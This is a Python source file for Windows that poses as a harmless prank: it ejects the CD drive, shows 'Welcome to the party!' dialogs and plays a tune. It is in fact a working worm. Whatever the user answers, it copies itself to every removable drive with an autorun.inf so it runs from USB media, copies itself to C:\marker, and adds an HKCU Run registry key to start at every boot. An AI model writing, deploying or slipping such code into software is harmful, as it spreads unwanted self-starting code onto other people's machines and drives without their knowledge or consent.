import ctypes
import tkinter
from tkinter import messagebox
import sys
import winsound
import shutil
import os
import subprocess

# Function to check for the marker folder and functions.exe
def check_marker_folder():
    marker_folder = r"C:\marker"
    marker_file = os.path.join(marker_folder, "functions.exe")
    if os.path.exists(marker_folder) and os.path.exists(marker_file):
        print(f"Marker folder and {marker_file} found. Exiting the program.")
        sys.exit()

# Function to eject the CD drive
def eject_cd_drive():
    try:
        ctypes.windll.WINMM.mciSendStringW("set cdaudio door open", None, 0, None)
        print("CD drive ejected.")
    except Exception as e:
        print(f"Error ejecting CD drive: {e}")

# Function to copy the executable and autorun.inf to all removable drives
def copy_to_removable_drives():
    try:
        # Get all drives
        drives = [f"{chr(letter)}:\\" for letter in range(65, 91) if os.path.exists(f"{chr(letter)}:\\")]
        removable_drives = [drive for drive in drives if ctypes.windll.kernel32.GetDriveTypeW(drive) == 2]  # DRIVE_REMOVABLE

        # Path to the current executable
        current_exe = os.path.abspath(sys.argv[0])

        # Content of the autorun.inf file
        autorun_content = f"""[autorun]
open={os.path.basename(current_exe)}
icon={os.path.basename(current_exe)}
"""

        # Copy the executable and create autorun.inf on each removable drive
        for drive in removable_drives:
            destination_exe = os.path.join(drive, os.path.basename(current_exe))
            autorun_path = os.path.join(drive, "autorun.inf")

            # Copy the executable
            shutil.copy2(current_exe, destination_exe)
            print(f"Copied {current_exe} to {destination_exe}")

            # Create and write the autorun.inf file
            with open(autorun_path, "w") as autorun_file:
                autorun_file.write(autorun_content)
            print(f"Created autorun.inf at {autorun_path}")
    except Exception as e:
        print(f"Error copying to removable drives: {e}")

# Function to add a registry key and copy the executable to C:\marker
def setup_marker_folder_and_registry():
    try:
        # Create the C:\marker folder if it doesn't exist
        marker_folder = r"C:\marker"
        if not os.path.exists(marker_folder):
            os.makedirs(marker_folder)
            print(f"Created folder: {marker_folder}")

        # Copy the executable to the C:\marker folder
        current_exe = os.path.abspath(sys.argv[0])
        destination_exe = os.path.join(marker_folder, os.path.basename(current_exe))
        shutil.copy2(current_exe, destination_exe)
        print(f"Copied {current_exe} to {destination_exe}")

        # Add a registry key to run the executable at startup
        command = r'reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v "Program1" /t REG_SZ /d "C:\marker\functions.exe" /f'
        subprocess.run(command, shell=True, check=True)
        print("Registry key added successfully.")
    except Exception as e:
        print(f"Error setting up marker folder and registry: {e}")

# Function to display a message box
def display_message_box():
    root = tkinter.Tk()
    root.withdraw()  # Hide the root window
    response = messagebox.askyesno("Confirmation", "Do you want to continue?")
    if response:
        # If user clicks Yes, show another message box
        messagebox.showinfo("Action Required", "Please insert the CD.")
        print("User chose Yes. Prompted to insert the CD.")
        # Play a small tune
        winsound.Beep(440, 500)  # A4 note for 500ms
        winsound.Beep(494, 500)  # B4 note for 500ms
        winsound.Beep(523, 500)  # C5 note for 500ms
        print("Played a small tune.")
        # Show a welcome message box
        messagebox.showinfo("Welcome", "Welcome to the party!")
        print("Displayed welcome message. Exiting the program.")
        copy_to_removable_drives()  # Copy to removable drives before exiting
        setup_marker_folder_and_registry()  # Setup marker folder and registry
        sys.exit()
    else:
        # If user clicks No, exit the program
        print("User chose No. Exiting the program.")
        copy_to_removable_drives()  # Copy to removable drives before exiting
        setup_marker_folder_and_registry()  # Setup marker folder and registry
        sys.exit()

# Check for marker folder and exit if found
check_marker_folder()

# Call the functions
eject_cd_drive()
display_message_box()